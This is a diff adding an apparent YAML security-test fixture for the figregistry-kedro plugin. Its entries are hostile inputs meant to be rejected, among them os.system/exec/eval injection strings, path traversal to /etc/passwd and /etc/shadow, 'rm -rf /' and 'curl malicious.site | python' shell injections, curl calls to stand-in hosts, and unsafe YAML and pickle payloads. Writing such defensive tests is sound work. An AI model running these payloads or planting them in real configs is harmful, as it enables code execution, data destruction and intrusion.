@@ -1,0 +1,323 @@
+# Security Test Configuration: Dynamic Import Injection Attack Vectors
+# This configuration file contains malicious entries designed to test protection against
+# unauthorized module loading, import path manipulation, and code injection through
+# dynamic import mechanisms and plugin discovery processes per Section 6.6.8.5
+
+# =============================================================================
+# SECTION 1: MODULE LOADING CONSTRAINT VIOLATIONS
+# Tests for unauthorized module loading and import boundary enforcement
+# =============================================================================
+
+# 1.1 - Attempt to load unauthorized system modules through hook configuration
+malicious_hook_config:
+  hooks:
+    # Direct system module injection attempt
+    - module: "os"
+      class: "system"
+      method: "execute"
+    # Subprocess module loading attempt
+    - module: "subprocess"
+      class: "Popen" 
+      method: "shell"
+    # Socket module for network boundary violation
+    - module: "socket"
+      class: "socket"
+      method: "connect"
+    # Importlib manipulation for dynamic loading bypass
+    - module: "importlib"
+      class: "import_module"
+      method: "__call__"
+
+# 1.2 - Python bytecode injection through module paths
+bytecode_injection:
+  plugin_modules:
+    # Attempt to load compiled bytecode directly
+    - "__pycache__/malicious.cpython-311.pyc"
+    # Direct .pyc file loading
+    - "malicious.pyc"
+    # Compiled module with path traversal
+    - "../../../system/__pycache__/os.cpython-311.pyc"
+
+# 1.3 - Standard library module loading constraints test
+stdlib_module_tests:
+  restricted_imports:
+    # File system manipulation modules
+    - "shutil"
+    - "pathlib.Path"
+    # Network modules
+    - "urllib.request"
+    - "http.client"
+    # Process control modules  
+    - "multiprocessing"
+    - "threading"
+    # System interaction modules
+    - "ctypes"
+    - "gc"
+
+# =============================================================================
+# SECTION 2: IMPORT PATH MANIPULATION EXPLOITS
+# Tests for path traversal and import path manipulation attacks
+# =============================================================================
+
+# 2.1 - Path traversal attempts in module specifications
+path_traversal_modules:
+  figregistry_modules:
+    # Parent directory traversal
+    - "../../../../../../etc/passwd"
+    - "../../../system/critical_module"
+    # Absolute path injection
+    - "/usr/bin/python"
+    - "/bin/sh"
+    - "C:\\Windows\\System32\\cmd.exe"
+    # URL-like paths for potential remote loading
+    - "https://malicious.site/payload.py"
+    - "file:///etc/shadow"
+    
+# 2.2 - Python import system manipulation
+import_system_abuse:
+  sys_path_injection:
+    # Attempt to modify sys.path through configuration
+    - "../malicious_modules"
+    - "/tmp/injected_modules"
+    - "."
+    - ""
+  python_path_manipulation:
+    # Environment variable injection attempts
+    - "${PYTHONPATH}/../../../"
+    - "$HOME/.local/malicious"
+    - "${PWD}/../system"
+
+# 2.3 - Module name manipulation with special characters
+module_name_exploits:
+  special_char_modules:
+    # Null byte injection
+    - "valid_module\x00malicious"
+    # Unicode manipulation
+    - "válid_mödule"  
+    # Control character injection
+    - "module\r\nmalicious_code"
+    # Shell command injection in module names
+    - "module; rm -rf /"
+    - "module && curl malicious.site"
+
+# =============================================================================
+# SECTION 3: PLUGIN DISCOVERY EXPLOITATION VECTORS
+# Tests for plugin discovery bypass and hook registration manipulation
+# =============================================================================
+
+# 3.1 - Hook registration bypass attempts
+hook_registration_exploits:
+  entry_points:
+    # Fake Kedro hook entry points
+    kedro.hooks:
+      - "malicious_hook = malicious.module:MaliciousHook"
+      - "system_hook = os:system"
+      - "eval_hook = builtins:eval"
+    # Dataset entry point manipulation
+    kedro.datasets:
+      - "MaliciousDataSet = subprocess:Popen"
+      - "SystemDataSet = os.system:__call__"
+
+# 3.2 - Plugin discovery mechanism abuse
+plugin_discovery_attacks:
+  setuptools_entry_points:
+    # Direct setuptools manipulation
+    console_scripts:
+      - "malicious_script = os:system"
+    # Pip installation hooks
+    pip_install_hooks:
+      - "post_install = malicious.payload:execute"
+      
+# 3.3 - Hook lifecycle exploitation
+lifecycle_hook_exploits:
+  before_pipeline_run:
+    # Code injection in hook parameters
+    - "exec('import os; os.system(\"whoami\")')"
+    - "__import__('subprocess').call(['curl', 'malicious.site'])"
+  after_config_loaded:
+    # Configuration manipulation through hooks
+    - "globals()['__builtins__']['exec']('malicious_code')"
+    - "getattr(__import__('os'), 'system')('malicious_command')"
+
+# =============================================================================
+# SECTION 4: CODE INJECTION THROUGH IMPORT MECHANISMS
+# Tests for code execution through import system abuse
+# =============================================================================
+
+# 4.1 - Direct code injection attempts in module specifications
+code_injection_vectors:
+  module_with_execution:
+    # Python code execution in module names
+    - "__import__('os').system('id')"
+    - "exec('print(\"injected_code\")')"
+    - "eval('__import__(\"subprocess\").call([\"whoami\"])')"
+    # Lambda function injection
+    - "(lambda: __import__('os').system('ls'))())"
+    
+# 4.2 - Import statement manipulation
+import_statement_abuse:
+  dynamic_import_calls:
+    # Importlib abuse for arbitrary code execution
+    - "importlib.import_module('os').system('malicious_command')"
+    # __import__ function direct calls
+    - "__import__('subprocess', fromlist=['call']).call(['curl', 'evil.site'])"
+    # Import with arbitrary attribute access
+    - "getattr(__import__('builtins'), 'exec')('malicious_payload')"
+
+# 4.3 - Pickle/serialization injection through imports
+serialization_attacks:
+  pickle_payloads:
+    # Pickled code objects
+    - "pickle.loads(base64.b64decode('malicious_pickle_payload'))"
+    # Marshal code objects  
+    - "marshal.loads(malicious_bytecode)"
+    # Eval/exec through deserialization
+    - "yaml.unsafe_load('!!python/object/apply:os.system [\"malicious_command\"]')"
+
+# =============================================================================
+# SECTION 5: KEDRO-SPECIFIC PLUGIN EXPLOITATION
+# Tests targeting figregistry-kedro plugin-specific attack vectors
+# =============================================================================
+
+# 5.1 - FigRegistryHooks exploitation attempts
+hooks_security_tests:
+  malicious_hook_registration:
+    # Attempt to override legitimate hook methods
+    before_pipeline_run: "malicious.payload:before_pipeline_run"
+    after_config_loaded: "system.exploit:config_loaded_exploit"
+    # Hook method injection
+    on_node_error: "__import__('os').system"
+    
+# 5.2 - FigureDataSet manipulation
+dataset_injection_tests:
+  malicious_dataset_config:
+    # Code injection in dataset parameters
+    filepath: "$(python -c 'import os; os.system(\"malicious_command\")')"
+    purpose: "__import__('subprocess').call(['curl', 'evil.site'])"
+    condition_param: "exec('injected_code')"
+    style_params:
+      # Nested code injection in style parameters
+      figure.title: "$(eval('malicious_expression'))"
+      axes.label: "__import__('os').getcwd()"
+
+# 5.3 - Configuration bridge exploitation
+config_bridge_attacks:
+  environment_injection:
+    # Environment variable manipulation
+    FIGREGISTRY_CONFIG: "/malicious/config/path"
+    KEDRO_CONFIG_LOADER: "malicious.loader:MaliciousLoader"
+    # Python path injection through environment
+    PYTHONPATH: "/tmp/malicious_modules:$PYTHONPATH"
+    
+# 5.4 - Catalog integration exploitation
+catalog_manipulation:
+  figregistry_catalog_entries:
+    # Malicious catalog dataset definitions
+    malicious_figure:
+      type: "subprocess.Popen"
+      args: ["curl", "malicious.site"] 
+    system_exploit:
+      type: "os.system"
+      command: "malicious_payload"
+
+# =============================================================================
+# SECTION 6: IMPORTLIB EXPLOITATION VECTORS
+# Advanced tests for importlib mechanism abuse
+# =============================================================================
+
+# 6.1 - Import mechanism bypass attempts
+importlib_exploits:
+  dynamic_loading_bypass:
+    # Direct importlib.util manipulation
+    - "importlib.util.spec_from_file_location('malicious', '/tmp/payload.py')"
+    # Module from string injection
+    - "importlib.util.module_from_spec(malicious_spec)"
+    # Import machinery manipulation
+    - "importlib.machinery.SourceFileLoader('exploit', '/tmp/exploit.py')"
+
+# 6.2 - Module resolution manipulation
+module_resolution_attacks:
+  finder_manipulation:
+    # Custom module finder injection
+    - "sys.meta_path.insert(0, MaliciousFinder())"
+    # Import hook manipulation
+    - "sys.path_hooks.append(malicious_path_hook)"
+    # Module cache poisoning
+    - "sys.modules['legitimate_module'] = malicious_module"
+
+# 6.3 - Namespace package exploitation
+namespace_package_attacks:
+  pkgutil_manipulation:
+    # Namespace package path injection
+    - "pkgutil.extend_path(['malicious_path'], 'legitimate_namespace')"
+    # Package discovery manipulation
+    - "pkgutil.find_loader('malicious.module')"
+
+# =============================================================================
+# SECTION 7: COMPREHENSIVE BOUNDARY TESTING
+# Combined attack vectors testing multiple security boundaries
+# =============================================================================
+
+# 7.1 - Multi-vector attacks combining different injection methods
+combined_attack_vectors:
+  complex_injection:
+    # Hook + import + code execution
+    hook_config:
+      module: "__import__('os')"
+      class: "system"  
+      args: ["curl malicious.site | python"]
+    # Dataset + environment + path traversal
+    dataset_config:
+      type: "figregistry_kedro.datasets.FigureDataSet"
+      filepath: "../../../../../../tmp/malicious_output"
+      purpose: "$(python -c 'import subprocess; subprocess.call([\"whoami\"])')"
+
+# 7.2 - Plugin lifecycle comprehensive exploitation
+lifecycle_comprehensive_test:
+  initialization_attacks:
+    # Plugin discovery phase
+    discovery: "malicious.discovery:hijack_plugin_loading"
+    # Hook registration phase  
+    registration: "system.exploit:register_malicious_hooks"
+    # Configuration loading phase
+    config_loading: "code.injection:execute_during_config_load"
+    # Runtime execution phase
+    runtime: "persistent.backdoor:maintain_access"
+
+# 7.3 - Security boundary validation matrix
+boundary_test_matrix:
+  # Test all combinations of attack vectors
+  import_plus_path_traversal:
+    module: "../../../malicious/__init__.py"
+    import_method: "__import__"
+  code_injection_plus_environment:
+    payload: "exec(os.environ.get('MALICIOUS_CODE', 'pass'))"
+    environment_setup: "export MALICIOUS_CODE='import subprocess; subprocess.call([\"id\"])'"
+  plugin_plus_serialization:
+    hook_data: "!!python/object/apply:subprocess.call [['curl', 'evil.site']]"
+    dataset_data: "pickle.loads(malicious_pickle_payload)"
+
+# =============================================================================
+# EXPECTED SECURITY BEHAVIOR VALIDATION
+# Configuration entries that should be safely rejected by security controls
+# =============================================================================
+
+# All above configurations should be safely rejected by:
+# 1. PyYAML safe_load() preventing code execution
+# 2. Pydantic validation rejecting malformed structures  
+# 3. Import path validation preventing unauthorized module loading
+# 4. Plugin discovery security preventing malicious hook registration
+# 5. Configuration bridge validation maintaining security boundaries
+# 6. FigureDataSet parameter validation preventing code injection
+# 7. Hook lifecycle security preventing unauthorized execution
+# 8. Environment isolation preventing privilege escalation
+
+# Security test validation should confirm:
+# - No arbitrary code execution occurs
+# - No unauthorized modules are loaded  
+# - No network connections are established
+# - No filesystem modifications outside designated paths
+# - No privilege escalation beyond current user context
+# - All malicious configurations are safely rejected with appropriate error messages
+# - Plugin functionality gracefully degrades without compromising security
+# - Configuration merge operations maintain validation boundaries
